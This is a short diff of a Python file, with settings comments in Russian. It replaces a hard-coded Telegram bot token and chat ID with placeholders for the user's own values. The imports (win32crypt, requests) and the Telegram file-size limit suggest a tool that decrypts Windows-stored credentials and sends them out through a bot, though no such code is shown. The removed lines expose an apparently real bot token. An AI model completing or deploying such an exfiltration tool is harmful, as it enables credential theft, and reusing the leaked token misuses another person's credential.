@@ -7,8 +7,8 @@ import requests
 from win32 import win32crypt
 
 # ===== НАСТРОЙКИ =====
-TELEGRAM_TOKEN = "8859636295:AAGX_EoRhTSsFPUOwQ9yQQe8nDU_3-BGtAU"
-CHAT_ID = "7245465625"
+TELEGRAM_TOKEN = "укажите токен своего бота"
+CHAT_ID = "айди своего аккаунта теллеграм"
 MAX_FILE_SIZE = 45 * 1024 * 1024
 # =====================
 
